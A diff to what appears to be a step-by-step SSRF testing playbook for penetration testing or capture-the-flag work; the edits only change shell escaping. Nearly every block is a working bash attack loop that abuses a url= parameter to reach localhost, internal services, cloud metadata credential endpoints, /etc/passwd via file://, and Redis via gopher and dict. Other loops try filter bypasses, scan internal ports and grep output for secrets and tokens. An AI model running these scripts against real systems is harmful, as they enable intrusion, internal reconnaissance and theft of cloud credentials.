@@ -34,11 +34,11 @@ Before testing, ensure you have a valid session:
 
 \`\`\`bash
 # Authenticate and save session
-curl -s -c cookies.txt -X POST "\$TARGET/login" \\
-  -d "username=\$USER&password=\$PASS"
+curl -s -c cookies.txt -X POST "$TARGET/login" \\
+  -d "username=$USER&password=$PASS"
 
 # Use session for subsequent requests
-AUTH_HEADER="Cookie: \$(cat cookies.txt | grep -v '^#' | awk '{print \$6\"=\"\$7}')"
+AUTH_HEADER="Cookie: $(cat cookies.txt | grep -v '^#' | awk '{print $6"="$7}')"
 \`\`\`
 
 ### Step 2: Identify SSRF Parameters
@@ -65,9 +65,9 @@ localhost_payloads=(
   "http://0.0.0.0"
 )
 for payload in "\${localhost_payloads[@]}"; do
-  response=\$(curl -s "\$TARGET?url=\$payload")
-  echo "Testing \$payload:"
-  echo "\$response" | head -20
+  response=$(curl -s "$TARGET?url=$payload")
+  echo "Testing $payload:"
+  echo "$response" | head -20
 done
 \`\`\`
 
@@ -82,9 +82,9 @@ internal_payloads=(
   "http://172.18.0.1"
 )
 for payload in "\${internal_payloads[@]}"; do
-  response=\$(curl -s "\$TARGET?url=\$payload")
-  if [ -n "\$response" ] && ! echo "\$response" | grep -qi "error\\|invalid\\|blocked"; then
-    echo "[+] Internal access possible: \$payload"
+  response=$(curl -s "$TARGET?url=$payload")
+  if [ -n "$response" ] && ! echo "$response" | grep -qi "error\\|invalid\\|blocked"; then
+    echo "[+] Internal access possible: $payload"
   fi
 done
 \`\`\`
@@ -102,10 +102,10 @@ internal_services=(
   "http://elasticsearch"
 )
 for service in "\${internal_services[@]}"; do
-  response=\$(curl -s "\$TARGET?url=\$service")
-  if [ -n "\$response" ]; then
-    echo "[+] Internal service accessible: \$service"
-    echo "\$response" | head -20
+  response=$(curl -s "$TARGET?url=$service")
+  if [ -n "$response" ]; then
+    echo "[+] Internal service accessible: $service"
+    echo "$response" | head -20
   fi
 done
 \`\`\`
@@ -136,10 +136,10 @@ azure_metadata=(
 
 # Test all cloud endpoints
 for endpoint in "\${aws_metadata[@]}" "\${gcp_metadata[@]}" "\${azure_metadata[@]}"; do
-  response=\$(curl -s "\$TARGET?url=\$endpoint")
-  if echo "\$response" | grep -qiE "ami-|instance|private|security-credentials|access.*key"; then
-    echo "[+] CRITICAL: Cloud metadata accessible via: \$endpoint"
-    echo "\$response"
+  response=$(curl -s "$TARGET?url=$endpoint")
+  if echo "$response" | grep -qiE "ami-|instance|private|security-credentials|access.*key"; then
+    echo "[+] CRITICAL: Cloud metadata accessible via: $endpoint"
+    echo "$response"
   fi
 done
 \`\`\`
@@ -158,19 +158,19 @@ file_payloads=(
   "file://localhost/etc/passwd"
 )
 for payload in "\${file_payloads[@]}"; do
-  response=\$(curl -s "\$TARGET?url=\$(echo -n "\$payload" | jq -sRr @uri)")
-  if echo "\$response" | grep -qE "root:x:|root:.*:0:0"; then
-    echo "[+] File protocol SSRF confirmed: \$payload"
+  response=$(curl -s "$TARGET?url=$(echo -n "$payload" | jq -sRr @uri)")
+  if echo "$response" | grep -qE "root:x:|root:.*:0:0"; then
+    echo "[+] File protocol SSRF confirmed: $payload"
   fi
 done
 
 # Gopher protocol (more advanced attacks)
-# gopher://127.0.0.1:6379/_*1%0d%0a\$4%0d%0aINFO%0d%0a  # Redis
+# gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a  # Redis
 
 # Dict protocol
 dict_payload="dict://127.0.0.1:6379/INFO"
-response=\$(curl -s "\$TARGET?url=\$dict_payload")
-if echo "\$response" | grep -qi "redis"; then
+response=$(curl -s "$TARGET?url=$dict_payload")
+if echo "$response" | grep -qi "redis"; then
   echo "[+] Dict protocol works - Redis accessible"
 fi
 \`\`\`
@@ -192,9 +192,9 @@ ip_bypasses=(
   "http://0.0.0.0"
 )
 for bypass in "\${ip_bypasses[@]}"; do
-  response=\$(curl -s "\$TARGET?url=\$bypass")
-  if [ -n "\$response" ]; then
-    echo "[+] IP bypass worked: \$bypass"
+  response=$(curl -s "$TARGET?url=$bypass")
+  if [ -n "$response" ]; then
+    echo "[+] IP bypass worked: $bypass"
   fi
 done
 \`\`\`
@@ -229,9 +229,9 @@ If SSRF is confirmed, use it to scan internal ports:
 # Scan common internal ports
 common_ports=(22 80 443 3306 5432 6379 8080 9200 27017)
 for port in "\${common_ports[@]}"; do
-  response=\$(curl -s --max-time 3 "\$TARGET?url=http://127.0.0.1:\$port")
-  if [ -n "\$response" ]; then
-    echo "[+] Port \$port appears open"
+  response=$(curl -s --max-time 3 "$TARGET?url=http://127.0.0.1:$port")
+  if [ -n "$response" ]; then
+    echo "[+] Port $port appears open"
   fi
 done
 \`\`\`
@@ -258,21 +258,21 @@ echo "[*] Exploiting SSRF vulnerability..."
 
 # Example: Accessing internal service
 SSRF_PAYLOAD="http://internal-service"
-response=\$(curl -s -H "\$AUTH_HEADER" \\
-  "\$TARGET?url=\$SSRF_PAYLOAD")
+response=$(curl -s -H "$AUTH_HEADER" \\
+  "$TARGET?url=$SSRF_PAYLOAD")
 
 # STEP 3: VALIDATE SUCCESS
 echo "[+] Response from internal service:"
-echo "\$response"
+echo "$response"
 
 # Check for sensitive data
-if echo "\$response" | grep -qiE "flag|secret|password|key|token|credential"; then
+if echo "$response" | grep -qiE "flag|secret|password|key|token|credential"; then
   echo "[+] SSRF CONFIRMED - Sensitive data retrieved from internal service"
   exit 0
 fi
 
 # Check for cloud metadata
-if echo "\$response" | grep -qiE "ami-|instance-id|security-credentials"; then
+if echo "$response" | grep -qiE "ami-|instance-id|security-credentials"; then
   echo "[+] SSRF CONFIRMED - Cloud metadata accessible"
   exit 0
 fi
